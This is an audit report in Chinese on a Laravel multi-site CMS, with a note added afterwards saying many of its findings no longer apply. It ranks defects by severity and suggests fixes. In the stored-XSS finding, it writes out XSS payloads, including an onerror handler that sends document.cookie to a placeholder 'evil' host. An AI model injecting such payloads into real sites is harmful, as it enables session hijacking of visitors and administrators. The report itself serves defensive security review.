# GEO Website OS 系统评估报告

> ## ⚠️ 基线错配警告（2026-10-02 20G-0 对账后追加）
>
> **本报告审计的不是 v1.0 最终基线，请勿据此给 v1.0 定罪。**
>
> | 项 | 值 |
> | --- | --- |
> | 本报告审计对象 | `D:\GEO-OS-rewrite\geo-website-os` @ `fd660b0`（2026-09-29） |
> | **v1.0 实际收口基线** | **`D:\734666\GEO OS` @ `91aef17`（2026-10-02，20F.1 release closure）** |
> | 差异 | 落后 3 个提交；迁移文件 66 → 40；**本报告引用的 2 个迁移文件在 v1.0 已删除** |
>
> **20G-0 对账结论**（详见 `D:\734666\GEO OS\docs\audit\20G-0-独立发现对账报告.md`）：
> - 50 项发现中 **32 项 ALREADY FIXED**、**5 项 SUPERSEDED**（依赖已删除文件）、**3 项 FALSE POSITIVE**（我的检测方法有误）
> - **7 项 CURRENT / CONFIRMED** 需处理，其中 3 项 P0：
>   1. `Narrative::renderMarkdown` 未净化（同构入口残留，主路径 `Content::renderMarkdown` 已修）
>   2. `unpublish` 不受 `sync_geoflow_enabled` 总开关保护
>   3. `/en/geo.json` facts 17/17 条未本地化
> - P0-2（GEOFlow 白名单）、P0-4（API 缺 ResolveSite）**已由 20F.1 修复**
> - P0-5 / P0-6 / P0-7 / P1-9（数据库类）在 v1.0 全新库实测**全部不成立**
>
> **本报告的正向结论仍然有效**：多站隔离、发布门禁、URL 单一裁决、缓存失效链路四项核心工程能力评价未变。
>
> **已识别的方法失误**（供后续评估参考）：
> 1. 未确认工作区/HEAD 即开始审计，审错 checkout
> 2. 用 `route:list` 默认输出判断中间件链（它默认不显示中间件列），导致 P0-4 误判
> 3. XSS 检测判据错误：用关键词匹配而非「是否含裸标签」，`escape` 模式下关键词仍存在但已实体化

---

| 项目 | 内容 |
| --- | --- |
| 评估对象 | GEO Website OS v1.0（`D:\GEO-OS-rewrite\geo-website-os`） |
| 技术栈 | Laravel 12.69.2 / PHP 8.4.25 / SQLite（默认）/ Blade + Tailwind v4 + Vite 7 |
| 评估方式 | 静态代码审阅 + 只读数据库探查 + HTTP 端到端实测 + 全量测试基线 |
| 评估日期 | 2026-10-02 |
| 报告版本 | v1.0（独立评估，未引用 `docs/audit/` 历史结论） |

---

## 0. 执行摘要

### 0.1 总体结论

这是一个**工程成熟度显著高于同类开源 CMS 的系统**，但存在**三类必须在上生产前解决的阻断级缺陷**。

正面来看，多站隔离、发布门禁、URL 单一裁决、缓存失效链路这四项核心工程能力做得扎实且相互咬合，不是纸面设计。本次评估中，前台全部页面 200 可达，5 个 GEO 端点全部正常输出，JSON-LD 与页面可见内容零冲突（30 项 FAQ/HowTo 全命中），73 个测试文件全绿。

问题集中在三处：

1. **安全**：Markdown 渲染未净化 HTML，`Content.body` 经 `{!! !!}` 直出，构成可经 GEOFlow API 远程触发的存储型 XSS（已实测确认渲染结果不转义事件属性）。
2. **GEOFlow 对接**：4 个接口中 3 个存在契约缺陷 —— 白名单含已删除列导致 500、总开关只保护 upsert 而 unpublish 可删内容、API 不经过站点解析使多站对接实际失效。这三项叠加意味着「关闭开关保护生产」和「多站分别对接」两个核心承诺均未成立。
3. **数据库**：`contents.slot` 建了全局唯一索引（漏 `site_id`），多站写入必然冲突；`content_tag` 完全没有 `site_id` 列也无外键，是多站隔离的实体漏洞。

### 0.2 发现统计

| 等级 | 数量 | 说明 |
| --- | --- | --- |
| **P0** | **9** | 阻断生产：安全漏洞、数据损坏、多站功能失效 |
| **P1** | **16** | 影响正确性/可靠性/契约可信度 |
| **P2** | **14** | 随数据量增长显现，或架构债 |
| **P3** | **11** | 技术债与优化建议 |
| 合计 | **50** | — |

### 0.3 测试基线

| 项 | 结果 |
| --- | --- |
| Unit 套件 | **61 passed**（416 assertions），7.87s |
| Feature 套件 | **125 个测试文件全绿**，0 failed / 0 skipped |
| 逐文件耗时 | 6s–63s，中位约 25s，全量串行约 50 分钟 |
| 并行执行 | **不可用**：缺 `brianium/paratest`，`--parallel` 直接抛 RequirementsException |

> 125 个文件逐个执行验证（每文件 60s 超时保护），无超时、无失败。测试覆盖多站隔离、实体约束、SEO 解析、GEO 产出、安装/升级/回滚、JSON-LD XSS、插件主题、可视一致性等。**这说明现有测试对已覆盖的回归防护到位——本报告的 50 项发现全部属于当前测试盲区。**

---

## 1. 优势

### 1.1 架构层面

**多站隔离是本系统最可靠的资产。** `BelongsToSite` trait 覆盖全部 24 个含 `site_id` 的模型，无一遗漏；`EntityRelation` 在模型 `saving` 钩子层校验两端实体 `site_id` 一致，违例抛异常（`app/Models/EntityRelation.php:44-66`），这是 DB 外键做不到的业务约束。全局 Scope 无法被子查询或 `with()` 绕过，`tests/Feature/EntitySiteIsolationTest.php` 等多个测试对此有回归保护。

**URL 单一裁决层（`PublicUrl`）是正确抽象。** 176 行取代了历史多套拼 URL 逻辑，canonical / JSON-LD / geo.json / sitemap / llms.txt 共用同一裁决源。`tests/Unit/UrlGeneratorGoldenTest.php` 用 11 组 golden case 锁定行为。

**内容发布门禁双路径共用。** `ContentGate` 单一实现同时服务后台手动发布（`ContentController.php:183`）与 GEOFlow 推送（`GeoflowSync.php:102`）。本次穷举所有能写 `status='published'` 的路径（`grep -rn "'status' => 'published'"`），确认不存在绕过门禁的后门 —— 后台 `update()` 的 `validateForm()` 根本不含 `status` 规则，未声明字段被 `Request::validate()` 丢弃。

**缓存失效链路完整闭环。** `AppServiceProvider.php:93-102` 为 12 个模型注册 `saved`/`deleted` → `PageCache::flush()`。GEOFlow 推送的 `$content->save()` 必然触发，因此前台可见性延迟为 **0**（实测 `X-Page-Cache` 头首页首 MISS 次 HIT，版本号机制无需删旧文件）。搜索索引同理，`SearchIndexSync` 挂在 `Content::saved` 上增量重算，无需人工 reindex。

**契约驱动的能力声明（方向正确，执行待收口）。** `SearchEngineInterface` + 驱动探测（`AppServiceProvider.php:69-73`）是 `Contracts/` 里唯一真正做对并被使用的契约：FTS5 不可用时自动回落 `DatabaseLikeEngine`，前台不会因此挂掉。

### 1.2 工程规范层面

- **安全基线经实测验证合格**：100+ 后台路由无一例外在 `['admin.auth','admin.site']` 组内，站点管理额外套 `super.admin`；CSRF 分组正确（web 组启用、api 组豁免）；SQL 全参数化，`SqliteFtsEngine` 全部 `?` 绑定；上传 MIME 真探测（实测「PHP 代码伪装 .jpg」「GIF 内容伪装 .jpg」均被拒绝）；`.env` 已被 `.gitignore` 忽略；`APP_DEBUG=false` 且 404 页无堆栈泄露。
- **CSP 分场景设计**：前台走 nonce，后台因 17 处内联事件保留 `unsafe-inline`（`SecurityHeaders.php:67-70`），并按 analytics provider 受控放开域名，默认最小权限。
- **表单链路防护完整**：限流 6 次/分、蜜罐、动态白名单校验、payload 字段隔离、IP/UA 服务端取值、邮件失败仅记日志且在事务提交后调用。
- **测试规模扎实**：133 个测试文件覆盖多站隔离、实体约束、SEO 解析、GEO 产出、安装/升级/回滚，并有「反向业务污染断言」守护核心层不含客户信息。

### 1.3 GEO/SEO 产出层面

| 项 | 实测结果 |
| --- | --- |
| JSON-LD | 100% 与页面可见内容一致，FAQ/HowTo 共 30 项零违规（避开 Google 处罚红线） |
| canonical / hreflang | 每页唯一，中英互指 + `x-default` 齐备 |
| robots.txt | 显式放行 30+ AI 爬虫，符合 GEO 时代需求 |
| 模板一致性 | 8 个行业模板共用 `default` 主题，Schema 由布局统一注入，**换模板不降级** |
| 语义结构 | 每页 h1 唯一，landmark 完整，`focus-visible` 覆盖 30 处 |
| 焦点缓存 | 匿名外壳占位回填 CSRF/CSP nonce/归因，**缓存命中不会钉死 nonce 或串号** |

---

## 2. Bug 清单（可复现的功能缺陷）

### P0-1 Markdown 存储型 XSS，可经 GEOFlow API 远程触发

| 项 | 内容 |
| --- | --- |
| 描述 | `Str::markdown()` 默认 `html_input=allow`，`Content.body` 无净化直接 `{!! !!}` 输出，原始 HTML 事件属性不被转义 |
| 位置 | `app/Models/Content.php:227-237`（渲染+缓存7天）<br>`resources/views/site/content.blade.php:54`（输出）<br>`resources/views/site/blocks/sys_about.blade.php:16`<br>`app/Services/Sync/GeoflowSync.php:28`（`body` 在白名单） |
| 实测证据 | `Str::markdown('<img src=x onerror=alert(1)>')` → 输出 `<img src=x onerror=alert(1)>`，`onerror` 未转义<br>`Str::markdown('[x](javascript:alert(1))')` → `<a href="javascript:alert(1)">` |
| 触发条件 | ① 后台编辑正文填入 `<img src=x onerror=fetch('//evil/'+document.cookie)>` 发布<br>② **无需后台账号**：`POST /api/v1/geoflow/contents` 带 token 传 `"body":"<img src=x onerror=...>"` |
| 影响 | 任意访客会话劫持（含超管访问前台时）；路径②使「token 泄露 → 全站持久化 XSS」成立 |
| 建议 | 渲染层统一净化：`Str::markdown($body, ['html_input'=>'strip','allow_unsafe_links'=>false])`；同步修 `ContentController:240`（mdPreview 回显）、`blocks/media_text.blade.php:23`、`blocks/rich_text.blade.php:17`；API 侧对 `body` 施加与后台一致的长度上限 |

### P0-2 GEOFlow 白名单含已删除列，`seo_title`/`seo_desc` 传入即 500

| 项 | 内容 |
| --- | --- |
| 描述 | `FILLABLE` 保留 `seo_title`/`seo_desc`，但迁移已 `dropColumn` 删除这两列；`Content` 是 `$guarded=[]`，无法拦截未定义列 |
| 位置 | `app/Services/Sync/GeoflowSync.php:31-33`（白名单）<br>`database/migrations/2026_09_19_000003_drop_legacy_seo_columns_from_contents.php:27`（删列）<br>`app/Models/Content.php:29`（`$guarded=[]`） |
| 实测证据 | `PRAGMA table_info(contents)` → 34 列，**无 `seo_title`/`seo_desc`**；`fill(['seo_title'=>'X'])` 后属性进入模型但 `save()` 生成 `UPDATE ... seo_title = ?` → `no such column` |
| 触发条件 | 上游按 `docs/audit/settings-inventory-17f.md:107` 的契约文档传 `seo_title` |
| 影响 | 上游按文档实现即触发故障；`APP_DEBUG=false` 使上游拿到通用错误页，无法定位 |
| 建议 | 从 `FILLABLE` 移除两键（SEO 应写入 `SeoMeta` 表，那才是正式事实源）；upsert 入口加 try/catch，`QueryException` → 422 + 明确 `errors` |

### P0-3 总开关只保护 upsert，unpublish 可在开关关闭时删内容

| 项 | 内容 |
| --- | --- |
| 描述 | `sync_geoflow_enabled` 仅在 `upsert` 检查，`unpublish`/`check`/`status` 三方法均无检查 |
| 位置 | `app/Services/Sync/GeoflowSync.php:51`（唯一检查点）<br>`app/Services/Sync/GeoflowSync.php:163-176`（unpublish 无检查，直接 `update(['status'=>'archived'])`） |
| 实测证据 | `grep -n "sync_geoflow_enabled" GeoflowSync.php` → 仅 `:51` 一处 |
| 触发条件 | 运维关闭开关止血后，持 token 的上游继续调用 unpublish |
| 影响 | **紧急止杀手段在最危险路径上失效** —— 开关关掉后仍能批量下架全站内容 |
| 建议 | 提取 `assertEnabled()`，在 `upsert`/`unpublish` 入口统一调用；`check`/`status` 作为只读预检可豁免，但响应回传 `push_enabled:false` 让上游自检 |

### P0-4 API 不经过 ResolveSite，多站隔离在对接链路上失效

| 项 | 内容 |
| --- | --- |
| 描述 | `ResolveSite` 仅注册在 `middleware->web`，api 分组只有 `api` + `geoflow.token`；`SiteContext::currentSite()` 走兜底分支恒定绑定 `slug=default` 的站点 |
| 位置 | `bootstrap/app.php:22-27`（api 分组）<br>`bootstrap/app.php:63-66`（ResolveSite 仅在 web）<br>`app/Support/SiteContext.php:46-53`（兜底绑定 default） |
| 实测证据 | `route:list --path=api/v1 -v` → 4 条 geoflow 路由中间件均只有 `api` + `geoflow.token`，**无 ResolveSite** |
| 后果链 | ① token 读的是 default 站的 `Setting::get('sync_geoflow_token')`，非 default 站管理员配的 token 永远不生效<br>② `Content::where('external_id')` 经 SiteScope 限定 default 站<br>③ 新建时 `BelongsToSite::creating` 注入 default 的 site_id |
| 影响 | 多站部署下 GEOFlow **只能往 default 站写内容**，「多站点 GEO 官网系统」在对接通道上是单站 |
| 建议 | 为 api 分组补 `ResolveSite`，或更稳妥：让 payload 必带 `site` 标识 + 白名单校验，不依赖 Host 头 |

### P0-5 `contents.slot` 全局唯一索引，多站写入必然冲突

| 项 | 内容 |
| --- | --- |
| 描述 | slot 唯一索引漏 `site_id`，与 slug 索引 `(site_id, slug, locale)` 不一致 |
| 位置 | `database/migrations/2026_09_23_000001_add_locale_to_translatables.php:185`<br>（历史：`:64` 曾正确改为 `UNIQUE(site_id, slot)`，locale 迁移重建时回退） |
| 实测证据 | `CREATE UNIQUE INDEX contents_slot_unique ON contents(slot)` —— **无 site_id** |
| 触发条件 | 创建第 2 个站点并在后台保存任一叙事插槽（`about.profile` 等） |
| 第二重危害 | 前台栏目页被 `not_slot` Scope 引导去扫这个唯一索引：`SEARCH contents USING INDEX contents_slot_unique (slot=?)` + `USE TEMP B-TREE FOR ORDER BY`；去掉 slot 条件后立刻回落到正确的 `contents_status_published_at_index` |
| 建议 | 重建为 `CREATE UNIQUE INDEX contents_slot_unique ON contents(site_id, slot)`；补 `(site_id, locale, status, category_id, published_at)` 复合索引 |

### P0-6 软删表唯一索引不含 deleted_at，slug 删除后无法复用

| 项 | 内容 |
| --- | --- |
| 描述 | `contents` 有 `deleted_at`，唯一索引不含它 |
| 位置 | `database/migrations/2026_09_23_000001_add_locale_to_translatables.php:181-184`<br>`app/Models/Content.php:27`（`use SoftDeletes`） |
| 实测证据 | `CREATE UNIQUE INDEX contents_site_slug_locale_unique ON contents(site_id, slug, locale)` —— 无 `deleted_at`；`ContentController.php:298-300` 的 `Rule::unique('contents','slug')` 走 `DB::table()` 原始查询，**不会自动附加 `deleted_at IS NULL`** |
| 触发条件 | 软删一篇 `slug=X` 的文章，再新建同 slug → 校验层与 DB 层双重报错 |
| 建议 | 改部分唯一索引 `... WHERE deleted_at IS NULL`（SQLite/PG 支持）；MySQL 需用生成列方案；`Rule::unique` 补 `->whereNull('deleted_at')` |

### P0-7 `content_tag` 完全没有 site_id，多站隔离存在实体漏洞

| 项 | 内容 |
| --- | --- |
| 描述 | 同文件 `tags`/`content_entity` 都有 `site_id`，唯独中间表漏了，且无任何外键 |
| 位置 | `database/migrations/2026_09_26_000001_create_content_hub_tables.php:31-40` |
| 实测证据 | `content_tag` 列：`id, content_id, tag_id, created_at, updated_at`（无 site_id）<br>`PRAGMA foreign_key_list(content_tag)` → 0 条外键 |
| 触发条件 | 站点 A、B 各建同名标签；`content_tag_unique(content_id, tag_id)` 允许同一 content 关联**其他站点的 tag** |
| 建议 | 加 `site_id` + `constrained('sites')`；唯一索引改 `(site_id, content_id, tag_id)`；`belongsToMany` 补 `withPivot('site_id')` |

### P0-8 全局异常处理为空

| 项 | 内容 |
| --- | --- |
| 描述 | `withExceptions` 回调体为空，无 report 定制、无 render 分支 |
| 位置 | `bootstrap/app.php:78-80` |
| 后果 | ① 前台未捕获异常渲染 Laravel 默认英文错误页，与全中文界面割裂<br>② 无 reference id，用户无可反馈信息，日志无 site_id（多站系统里「这个异常是哪个站的」查不到）<br>③ **API 请求会拿到 HTML 错误页** —— `api/v1/*` 在 DB 异常时返回 HTML，上游 SDK 解析直接失败 |
| 建议 | 补 `report()`（注入 site_id/路由/用户上下文）与 `render()`（`expectsJson()` 时返回含 `ref` 短引用码的 JSON） |

### P0-9 `/en/geo.json` facts 层全未本地化，英文站 GEO 层实质失效

| 项 | 内容 |
| --- | --- |
| 描述 | entities/contents 已走 `forLocale` 正确本地化，唯独 facts 的 label/value 无 `_en` 回退 |
| 位置 | `app/Services/Geo/GeoGraphBuilder.php:95-96` |
| 实测证据 | 见下表 |
| 影响 | 英文站对外声明英文语境却输出中文事实库，LLM 语义抽取会把「公司全称」当字面串而非实体关系 |
| 建议 | 按 `LocaleContext::current()` 回退 `label_en`/`value_en`（或从既有 `*_en` 约定派生）；补测试断言 en 端 facts 无 CJK |

| 指标 | zh | en |
| --- | --- | --- |
| facts 总数 | 17 | 17 |
| facts label 含中文 | 17/17 | **17/17（未本地化）** |
| entities name 含中文 | 12/12 | 0/6（已本地化） |
| contents title 含中文 | 3/3 | 0/3（已本地化） |

> 中英 facts 数量一致（17=17）证明不是数据缺失，而是纯代码缺陷。对应 CHANGELOG 已登记的 TD-163，至今未修。

---

### P1 级别 Bug

| 编号 | 问题 | 位置 | 触发条件 | 建议 |
| --- | --- | --- | --- | --- |
| P1-1 | **幂等指纹覆盖不全，静默丢数据**：仅哈希 7 字段，slug/owner/category/geo_faq 变更时指纹相同 → 返回 `action=skip` + HTTP 200「内容未变化」，**上游永不重试** | `app/Models/Content.php:241-252`<br>`app/Services/Sync/GeoflowSync.php:74-83` | GEOFlow 只改 slug（换 URL）或 owner/category/geo_faq | 纳入全部受管字段；改为「增量合并后再算指纹」；skip 响应补 `changed_fields` |
| P1-2 | **`array_filter` 丢弃 null，字段无法清空**：上游传 `"summary": null` 意图清空，null 被过滤掉，保留旧值 | `app/Services/Sync/GeoflowSync.php:221` | GEOFlow 清空 `geo_boundary`（"该内容不再适用"的标准信号） | 用 `array_key_exists` 区分「未传」与「显式 null」 |
| P1-3 | **`unpublish` 不受 `lock_manual` 保护**：upsert 有冲突保护，unpublish 直接归档且不写 ContentRevision，事后无法还原 | `app/Services/Sync/GeoflowSync.php:169` | 人工精修内容（`lock_manual=1`）被上游下架 | unpublish 增加 lock 判定，冲突返 409；补写 revision 快照 |
| P1-4 | **`external_id` 无唯一约束，并发推送产生重复行**：先查后插模式，无 `lockForUpdate`、无 DB 约束 | `database/migrations/2026_09_14_000003_create_contents_table.php:73`（`index` 非 `unique`）<br>`GeoflowSync.php:63-64` | 上游重试/多线程/网关重发 | 加 `unique(['site_id','external_id'])`；查询改 `lockForUpdate()` |
| P1-5 | **`check` 端点无类型防御**：`type` 传数组直接 TypeError→500 | `app/Services/Sync/GeoflowSync.php:157` | `{"type":["a"]}` | 抽 `normalizePayload()` 复用 upsert 的白名单；对所有入模型字段做 `is_scalar` 断言 |
| P1-6 | **GEOFlow 全无输入长度校验**：schema 是 `title varchar(200)`，SQLite 不强制长度 → 开发无感，切 MySQL 才炸 | `app/Services/Sync/GeoflowSync.php` 全文 | 上游传超长 title | 用 FormRequest，规则与 `ContentController::validateForm()` 同源 |
| P1-7 | **错误响应契约不统一**：`check` 无 `ok` 字段且恒 200（门禁不通过也是 200）；`unpublish` 直接返回整个 Eloquent 模型（泄露 body/lock_manual/content_hash） | `app/Http/Controllers/Api/GeoflowController.php:24-61` | 上游按 HTTP 状态码判断 | 统一为 `{ok, code, message, errors, data}`，所有响应回带 `external_id` |
| P1-8 | **GEOFlow 无未来时间校验**：与后台路径不一致 | `GeoflowSync.php`（后台 `ContentController:192-194` 有校验） | 上游传未来 `published_at` → 后台显示已发布、前台 404 | 复用后台校验逻辑 |
| P1-9 | **迁移含 MySQL 不支持的 partial index**（6 个文件）+ 无守卫的 SQLite 专有 DDL | `2026_09_18_000004:192`（`PRAGMA foreign_keys`）、`2026_09_18_000007`、`2026_09_19_000001`、`2026_09_23_000001`、`2026_09_23_000012`、`2026_09_23_000013`、`2026_09_24_000015` | `DB_CONNECTION=mysql` 执行 migrate | 二选一：改 README 为「仅支持 SQLite」，或为每个 partial index 提供生成列方案 + CI 三驱动矩阵 |
| P1-10 | **前台 JSON-LD/案例渲染 N+1**：循环内 `Entity::withoutSiteScope()->find()` | `app/Services/Geo/SchemaBuilder.php:396-397`<br>`app/Http/Controllers/Site/CaseController.php:127`<br>`resources/views/site/blocks/logo_cloud.blade.php:7`（**视图内**查库） | 案例数上百即数百次查询 | `whereIn('id',...)->get()->keyBy('id')` 一次取回 |
| P1-11 | **DashboardController 全表加载 + 8 次独立 count** | `app/Http/Controllers/Admin/DashboardController.php:22-47` | 内容过千，每次开仪表盘 | 合并为单条 `GROUP BY`；门禁改 `chunkById(200)` |
| P1-12 | **`canUseSiteScopeBypass()` 定义了但零调用**：`withoutSiteScope()` 27 处调用，仅 3 处自行补了 `canCrossSite()` 检查，其余 24 处无授权 | `app/Support/SystemAuthorization.php:70-79`<br>`app/Support/BelongsToSite.php:53-56` | 未来新增一处 `withoutSiteScope()` 忘记加检查 | 在 `scopeWithoutSiteScope()` 内加断言，非 CLI/Queue 上下文 `abort_unless(...,403)` |
| P1-13 | **Product schema 缺 `image`**：仅 `ogImage` 非空时写，Google Product rich result 缺图不展示缩略图；Article 缺 `image` 与 `author` | `app/Services/Geo/SchemaBuilder.php:340-357` | 全站产品页 | `image` 兜底到实体媒体或 `og-default.png`；`article()` 补 author |
| P1-14 | **Organization `@id` 跨语言冲突**：`baseUrl()` 不含 locale prefix，中英页共用同一 `@id`，且英文页 `url` 未带 `/en` | `app/Services/Geo/SchemaBuilder.php:108-112` | 访问 `/en` | `@id` 加 `localePrefix()`，或统一为语言无关站点级 @id 但 url 随之本地化 |
| P1-15 | **sitemap `lastmod` 对产品/场景/静态页虚高为当天**：只有 case 和 article 传了真实 `updated_at` | `app/Services/Geo/SitemapBuilder.php:43` | 实测 sitemap 标 10-02，DB 实际 09-30 | 实体页统一传 `($entity->updated_at ?? $entity->published_at)?->toDateString()` |
| P1-16 | **`GeoFlowSync` 绕过 `SiteScope` 读 default 站的 token**（与 P0-4 同源，但表现为安全边界） | `app/Http/Middleware/VerifyGeoflowToken.php:18` | 多站部署 | 同 P0-4 |

---

### P2 级别 Bug

| 编号 | 问题 | 位置 | 影响 |
| --- | --- | --- | --- |
| P2-1 | `entity_relations`/`content_entity` 的 `site_id` 冗余且无一致性约束，允许关系行指向他站实体 | `database/migrations/2026_09_18_000009:16-18` | 跨站污染（当前数据为 0） |
| P2-2 | slug 唯一性「先查后插」竞态，查询在事务外 | `app/Support/EntitySlug.php:44-52` | 并发下靠唯一索引兜底但抛 500 |
| P2-3 | 8 张表有 `site_id` 但无外键兜底（forms/form_fields/form_submissions/pages/search_documents/tags/content_tag/content_entity） | `PRAGMA foreign_key_list` 实测 | 站点删除时无 RESTRICT 保护 |
| P2-4 | `site_id` 回填硬编码为 `1`，多站导入会串站 | `2026_09_18_000004:194,222`<br>`2026_09_18_000002:49` | 多站首建需手工修数据 |
| P2-5 | seed 型迁移 `down()` 会删除运营数据，不可逆 | `2026_09_14_000011:86-89` 等 4 个 | 生产 `migrate:rollback` 会物理删除人工修改 |
| P2-6 | 43 张表**零** `created_by`/`updated_by` | 实测 PRAGMA 全表扫描 | 多人协作后无法回答「谁改的」 |
| P2-7 | `/cases/` 现状 404（`CaseController.php:33` 显式 abort） | 实测 | **设计内行为**，sitemap 有对应防护，无死链，非缺陷 |
| P2-8 | 表单错误态用 `--brand`（蓝）而非 `--error`（红），违反 design-system §3.1「红色仅用于错误态」 | `resources/views/layouts/site.blade.php:1266,1267,1283` | 客户可见的规范违反 |
| P2-9 | 标题层级跳级 h2→h4 / h1→h3（16 页中 13 页存在） | `site.blade.php:1628,1671`<br>`site/_process_steps.blade.php:10` | 可访问性与语义 |
| P2-10 | 主题切换按钮 `aria-label` 挂在 `<label>` 而非可聚焦元素；全站 `aria-expanded` 计数为 0 | `site.blade.php:1485,1544` | 移动端菜单状态不播报 |
| P2-11 | 缺 skip link 与 live region | 实测 `skip`=0、`aria-live`=0 | 键盘用户需 Tab 穿过完整导航 |
| P2-12 | `--ink-faint #848991` 对比度 3.52:1，未达 WCAG AA 4.5:1；`--warning #E6A23C` 仅 2.19:1 | `site.blade.php:666,687,695,803` 等 30 处消费 | 承载 12-13px 小字，最需对比度的场景 |
| P2-13 | 知识中心栏目页 meta description 多页重复 | `SeoMetaResolver` 栏目页 fallback 未按 `groups` 差异化 | Google 明确的低质量信号 |
| P2-14 | `?site_slug=` 在 admin 路径被接受，且 `ResolveSite` 排在 `EnsureAdmin` 之前 | `app/Support/SiteResolver.php:35-42` | 当前仅 1 超管无法利用；引入多用户后普通管理员可能跨站 |

---

### P3 级别（技术债与优化）

| 编号 | 问题 | 位置/依据 |
| --- | --- | --- |
| P3-1 | 72 处 `Entity::TYPE_*` 硬编码散在 17 个文件，`EntityCapabilityRegistry` 注释承诺的「禁止散点硬编码」已破 | `Catalog.php`(19) `EntityController.php`(16) `WizardController.php`(6) 等 |
| P3-2 | `EntityRepository` 生产代码零引用（死代码），却有 6 个测试在守护它 | `app/Repositories/EntityRepository.php` |
| P3-3 | `Contracts/` 唯一接口 `UrlResolverInterface` 空转：注入后从不使用，实现类已 `@deprecated` | `app/Services/Seo/SeoMetaResolver.php:37` |
| P3-4 | `Facts` 类 + `config/facts.php`（1375 行，全项目最大配置）已被 Catalog 取代但未删，生产零引用 | `app/Support/Facts.php` |
| P3-5 | 无任何队列任务（`grep -rln "ShouldQueue" app/` 零匹配），邮件与图片压缩在 HTTP 线程内同步执行 | `FormNotificationSender.php:42-46`、`MediaController.php:48,81` |
| P3-6 | 6 处 `catch(\Throwable)` 无日志静默，其中 `ImageOptimizer.php:206` 是用户可见功能的失败路径 | `PluginManager.php:258`、`ThemeManager.php:121` 等 |
| P3-7 | 中英 `llms.txt` 两套平行实现（241+156 行），改文案要记得改两处 | `LlmsBuilder.php:25,301` |
| P3-8 | 英文 llms.txt 显著稀薄：2478B vs 6031B，产品 2 vs 4，丢失「保持主体名称完整」等实体命名约束 | 实测对比 |
| P3-9 | 52 个超过 300 行的方法；最大 `ThemePalette::resolve()` 276 行单方法 | 全局统计 |
| P3-10 | 14 个测试扫描源码文本（如断言「文件 X 不含字符串 Y」），任何重构都假失败 | `SeoHttpIntegrationTest.php:273-292` 等 |
| P3-11 | 前台每页 91KB 内联 CSS 占 HTML 68%，零外部样式表，跨页零缓存收益 | 实测首页 133KB |

---

## 3. 分维度评估

### 3.1 架构设计

**分层现状**：名义四层（Controller → Service/Support → Model → Database），实际数据访问有**三条并存的路径**：

| 路径 | 消费者 | 形式 |
| --- | --- | --- |
| `Support\Catalog`（887 行静态类） | 35 个文件 | 全静态 + 全局 memo |
| Controller 直连 Model | 30 个控制器（`SeoMetaController` 24 处、`PageController` 21 处） | 直接 `::query()` |
| `Repositories\EntityRepository` | **0 个生产文件** | 未被使用 |

**模块边界**：`Support/` 下 27 个子命名空间 + 根目录 4 个平级业务类（`Catalog`/`Facts`/`Copy`/`Narrative`）缺乏边界规则。`AppServiceProvider.php`（784 行）除服务注册外还承担**导航菜单与页脚的组装逻辑**（`mainMenuBlueprint` 111 行、`footerBlueprint` 132 行），这些是业务领域逻辑，因被 View composer 调用而寄身 ServiceProvider，导致无法单元测试。

**可扩展性**：新增第 9 种实体类型需改 `config/entities.php` + 至少 6-8 个文件（见 P3-1），且**没有任何测试会告诉你漏了哪个**。三份 URL 裁决逻辑并存（`PublicUrl::entity()`、`SearchIndexBuilder::path` 的 match、`GenericUrlResolver::generateCanonical()`），其中 `SearchIndexBuilder.php:214` 的 `default` 分支会静默把新类型指向 404 地址。

**演进能力**：有 `geo:install`/`geo:upgrade`/`geo:version`/`geo:backup`/`geo:rollback` 完整生命周期命令，CHANGELOG 规范（Keep a Changelog + SemVer），66 个迁移全部有 `down()`。这部分工程实践优于多数同类项目。

**评级：良好（分层概念正确，执行打 7 折）**

### 3.2 技术实现

**代码质量**：命名规范一致，中文注释解释「为什么」而非「是什么」（如 `routes/web.php` 详述 en/zh 注册顺序与 catch-all 抢占问题）。这是高水平的代码素养。

**主要问题**：超大类偏多（9 个超 300 行类、52 个超 300 行方法）；`Support/` 边界模糊；`AppServiceProvider` 职责过载；缓存失效的 11 模型清单硬编码在 Provider（新增前台展示模型若忘记改此列表 → 页面缓存不失效 → 用户看到旧页面）。

**技术选型**：Laravel 12 + PHP 8.4 合理；`SearchEngineInterface` 驱动探测设计正确；无外部搜索依赖降低部署门槛。**但无队列**（composer.json 的 dev script 已起 `queue:listen`，说明设计意图存在）—— 邮件与图片压缩同步执行，SMTP 超时会直接拖住表单提交。

**异常处理**：`withExceptions` 为空（P0-8）+ 6 处静默吞异常（P3-6）= 异常治理两头失守：该冒泡的被吞掉，不该冒泡的没包装没报告。

**评级：中上（需补齐异常治理与队列）**

### 3.3 数据库

**表结构**：44 张业务表 `site_id` 覆盖率 100%（除 `content_tag`，P0-7），外键约束覆盖不全（8 表缺 site_id 外键，P2-3），43 表零审计字段（P2-6）。

**索引**：5 个 P0/P1 级索引问题（slot 全局唯一、软删表唯一索引、partial index 跨库、contents 缺 locale 复合索引、entities_slug_index 低价值冗余）。

**查询性能**：前台核心路径存在 N+1 与索引误选（`not_slot` Scope 把栏目页查询引导到 slot 唯一索引）。当前数据量（18 实体/58 关系）下无症状，属「随数据量增长显现」。

**数据一致性**：事务边界基本正确（邮件已移出事务）；`entity_relations` 有跨站写入的模型级拦截（正确）；`site_id` 冗余字段无一致性约束（P2-1）。

**迁移质量**：66 个迁移 100% 有 `down()`，但 4 个 seed 型迁移的 `down()` 会删运营数据（P2-5）。12 个迁移含裸 SQL，跨库不可移植（P1-9）。

**评级：中等（结构良好，索引与跨库能力需返工）**

### 3.4 业务逻辑

**核心流程正确性**：发布门禁双路径共用且无绕过（正面）；内容状态机无集中校验，存在下架语义分叉（后台 unpublish→`draft` vs GEOFlow→`archived`），且无迁移白名单。

**边界条件**：表单/留言链路防护完整（正面）；GEOFlow 侧长度校验、类型防御缺失（P1-5、P1-6）。

**并发与幂等**：`external_id` 无唯一约束（P1-4）+ 指纹覆盖不全（P1-1）= 幂等机制两头漏。

**状态流转**：见 P1-3（unpublish 绕过 lock_manual）、P1-8（未来时间）。

**评级：中等（门禁做对，对接侧幂等与状态一致性薄弱）**

### 3.5 能力完整性

**覆盖度**（已实现）：多站、Entity 8 型 + 知识图谱、SEO 统一解析层、GEO 6 产出、发布门禁、5 步安装器、升级/备份/回滚、Setup Wizard 6 步、GEO Health 5 检查、Entity Coverage 看板、8 个行业模板包、主题/插件运行时开关、审计日志、媒体引用守卫、整页缓存 + FTS5 搜索（带 LIKE 回落）、图片优化（WebP+EXIF 方向）、15 个 Artisan 命令。

